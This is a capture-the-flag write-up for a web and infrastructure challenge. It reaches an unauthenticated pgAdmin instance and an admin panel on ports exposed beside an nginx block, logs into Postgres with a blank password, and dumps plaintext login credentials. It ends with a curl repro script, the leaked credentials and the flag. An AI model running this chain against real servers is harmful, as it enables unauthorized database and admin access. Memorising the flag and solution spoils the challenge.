# Сотолёт (Avito CTF 2026) — Infra+Web, Easy, 1000 pts

**Flag:** `avito{5ot0lE7_que3N_bEar1NG}`

## Host map

| Host | Purpose | Front door (443/nginx) | Real service |
|---|---|---|---|
| `sotolet.ru` (84.201.131.80) | Public flights radar (Flask/Jinja SSR + vanilla JS SVG map) | 200, normal | Flask app behind nginx, no auth needed (public by design) |
| `sotobaza.sotolet.ru` | "Soto-base" = the Postgres database, admin'd via **pgAdmin 4 v9.16** | 403 (nginx `deny all` on that vhost, same IP) | **pgAdmin4 exposed unauthenticated on `84.201.131.80:8080` (plain HTTP, gunicorn)**, completely bypassing the nginx IP allow-list on port 443 |
| `sotokabina.sotolet.ru` | "Soto-cabin" = the Senior Dispatcher admin panel (Flask, session-cookie login) | 403 (same nginx deny) | **Exposed unauthenticated (pre-login) on `84.201.131.80:8443` (plain HTTP despite the port number, gunicorn)**, same bypass pattern |

Both subdomains resolve to the **same IP** as the main portal and are blocked at the nginx layer (`server_name` vhost with `deny all;`) — confirmed with Host-header/SNI mismatch tests, X-Forwarded-For/X-Real-IP spoofing (no effect). The actual infra flaw is that **the backend app servers for both internal tools are also directly reachable on their own TCP ports on the same public IP**, completely outside nginx's reverse-proxy/ACL layer. This is the "Infra" half of the bug.

## Recon trail

1. `GET https://sotolet.ru/` → SSR page, status panel says `Режим: PUBLIC — закрытые маршруты не выводятся`, links to `sotobaza.sotolet.ru` and `sotokabina.sotolet.ru`.
2. `/static/js/tactical-map.js` → calls `GET /api/map-data`, then does **client-side filtering**: `visibleRoutes = routes.filter(r => !r.hidden)`.
3. `GET https://sotolet.ru/api/map-data` → returns all 5 routes including `queen-route` (`hidden:true`), but the server had **already masked** its fields server-side: `path:"XXX XXX ..."`, `duration:"закрыто"`, `distance:"закрыто"`, `status:"секретный"`. So the naive "just call the unfiltered API" IDOR does **not** work — masking happens before the JSON leaves the server, not just in the browser.
4. `sotobaza.sotolet.ru` / `sotokabina.sotolet.ru` over HTTPS/HTTP on 80/443 → blanket `403 Forbidden` (plain nginx default page) for every path tried.
5. TCP probing `84.201.131.80` found two real extra HTTP services:
   - `http://84.201.131.80:8080/` → `Server: gunicorn`, redirects to `/browser/`, sets `pga4_session` cookie → **pgAdmin 4**.
   - `http://84.201.131.80:8443/` → `Server: gunicorn`, redirects to `/login`, HTML title **"Вход в Сотокабину"** → the dispatcher panel's own login page, with `login` (позывной/callsign) + `password` (код смены/shift code) fields.

## Step 1 — pgAdmin (sotobaza) → DB read access, no login needed

`pgAdmin4` is running with **`server_mode = 'False'`** (desktop/single-user mode — confirmed by reading the per-session generated JS at `GET /browser/js/utils.js`, which literally embeds:
```js
pgAdmin['csrf_token_header'] = 'X-pgA-CSRFToken';
pgAdmin['csrf_token'] = '<signed token>';
pgAdmin['server_mode'] = 'False';
```
In desktop mode there is **no login wall at all** — you just need the per-session CSRF token (served pre-auth by that same JS file) echoed back as the `X-pgA-CSRFToken` header alongside the `pga4_session` cookie, and every pgAdmin API becomes usable.

Using that:
- `GET /browser/server/nodes/1/` → one registered server, `"Sotobaza"`, `host: db`, `db: sotobaza`, `user: bee`, **`is_password_saved: false`**.
- `POST /browser/server/connect/1/1` with `{"password":""}` → **`"Server connected."`** — Postgres accepts an **empty password for user `bee`** (trust/blank-password auth from the pgAdmin container's network).
- Browsed the tree: DB `sotobaza` → schema `public` → tables `dispatchers`, `tactical_hives`, `tactical_routes`, `tactical_sectors`.
- Ran real SQL via the Query Tool REST API (`POST /sqleditor/initialize/sqleditor/<trans_id>/<sgid>/<sid>/<did>` **with `{"dbname":"sotobaza"}` in the body** — omitting `dbname` throws a bare `KeyError: 'dbname'`, then `POST /sqleditor/query_tool/start/<trans_id>` with `{"sql": "..."}`, then poll `GET /sqleditor/poll/<trans_id>`):

```sql
SELECT * FROM dispatchers;
```
```
id | callsign      | role     | shift_code
1  | pchela-042    | operator | SMENA-042-NEKTAR
2  | pchela-117    | operator | SMENA-117-PYLCA
3  | starshina_sot | chief    | SMENA-STARSHINA-7741
```

`starshina_sot` / `chief` = "старшина сот" = the **senior dispatcher**. These are plaintext login credentials for the *application*, not the DB — confirmed the `tactical_routes` row for `queen-route` is masked (`"XXX XXX..."`, `"закрыто"`) **even at the raw row level**, so pulling it via SQL as `bee` is a dead end (`bee` is a low-priv role; `chief` is `rolsuper=true` in Postgres too, but its **actual DB password is not blank** — tried empty and the shift-code string, both rejected with `password authentication failed`; a genuine dead end/decoy, not the intended path).

## Step 2 — sotokabina (port 8443) → real login with the leaked creds

`http://84.201.131.80:8443/login` is the Сотокабина ("dispatcher cabin") panel — a small Flask app, its own session, completely separate from pgAdmin, exposed **unauthenticated on port 8443 in plain HTTP** (bypassing the nginx `deny all` on `sotokabina.sotolet.ru:443`).

```
POST http://84.201.131.80:8443/login
Content-Type: application/x-www-form-urlencoded

login=starshina_sot&password=SMENA-STARSHINA-7741
```
→ `302 Found`, `Set-Cookie: session=eyJjYWxsc2lnbiI6InN0YXJzaGluYV9zb3QifQ...` (session payload decodes to `{"callsign":"starshina_sot"}`).

Logged-in root page confirms `ADMIN` / `starshina_sot`, three tabs (Маршруты/Ульи/Секторы), loads `/static/js/admin.js`, which fetches `GET /api/admin-data`.

## Step 3 — the flag

```
GET http://84.201.131.80:8443/api/admin-data   (with the session cookie from step 2)
```
returns the full unmasked map, and the `queen-route` entry now carries the real payload:

```json
{
  "id": "queen-route",
  "name": "Маршрут Королевы",
  "status": "FLAG",
  "path": "XXX XXX XXX XXX XXX XXX XXX XXX",
  "distance": "avito{5ot0lE7_que3N_bEar1NG}",
  "flag": "avito{5ot0lE7_que3N_bEar1NG}",
  "hidden": true
}
```

`admin.js`'s `renderRouteCard()` even has a special case for `route.id === "queen-route"` that renders `route.flag` into the "Траектория" (trajectory) field in the UI.

## Root cause summary

1. **Client-side-only filtering illusion, but not the real bug**: `/api/map-data` looked like a classic "server sends everything, client hides `hidden:true`" IDOR, but the server actually masks the sensitive fields before responding — a red herring that correctly resisted the naive approach.
2. **Real bug #1 (Infra)**: pgAdmin4 for the "Sotobaza" Postgres instance is bound directly to `0.0.0.0:8080` in **desktop/no-auth mode** (`server_mode = False`), reachable straight on the origin IP, completely bypassing the nginx `deny all` meant to gate `sotobaza.sotolet.ru`. Combined with Postgres accepting an **empty password for the low-priv `bee` role**, this gives full read access to the `dispatchers` credentials table.
3. **Real bug #2 (Infra)**: the Сотокабина dispatcher admin app is likewise directly reachable on `84.201.131.80:8443` over **plain HTTP**, bypassing the nginx ACL meant to gate `sotokabina.sotolet.ru`, so the leaked `starshina_sot`/`SMENA-STARSHINA-7741` credentials could be used to log straight into the senior-dispatcher panel and pull `/api/admin-data`, which returns the true (unmasked) Queen's route containing the flag.

## Key requests (repro)

```bash
# 1. pgAdmin CSRF token (no auth needed, desktop mode)
curl -s http://84.201.131.80:8080/browser/js/utils.js | grep csrf_token

# 2. connect as bee with blank password
curl -s -X POST http://84.201.131.80:8080/browser/server/connect/1/1 \
  -H "X-pgA-CSRFToken: <token>" -H "Content-Type: application/json" \
  -c cj -b cj -d '{"password":""}'

# 3. run SQL to dump dispatcher creds
curl -s -X POST http://84.201.131.80:8080/sqleditor/initialize/sqleditor/1/1/1/16384 \
  -H "X-pgA-CSRFToken: <token>" -H "Content-Type: application/json" \
  -c cj -b cj -d '{"dbname":"sotobaza"}'
curl -s -X POST http://84.201.131.80:8080/sqleditor/query_tool/start/1 \
  -H "X-pgA-CSRFToken: <token>" -H "Content-Type: application/json" \
  -c cj -b cj -d '{"sql":"SELECT * FROM dispatchers;"}'
curl -s http://84.201.131.80:8080/sqleditor/poll/1 -H "X-pgA-CSRFToken: <token>" -c cj -b cj

# 4. login to the dispatcher panel directly on its exposed port
curl -s -c kcj -X POST http://84.201.131.80:8443/login \
  --data-urlencode "login=starshina_sot" --data-urlencode "password=SMENA-STARSHINA-7741"

# 5. pull the flag
curl -s -b kcj http://84.201.131.80:8443/api/admin-data
```
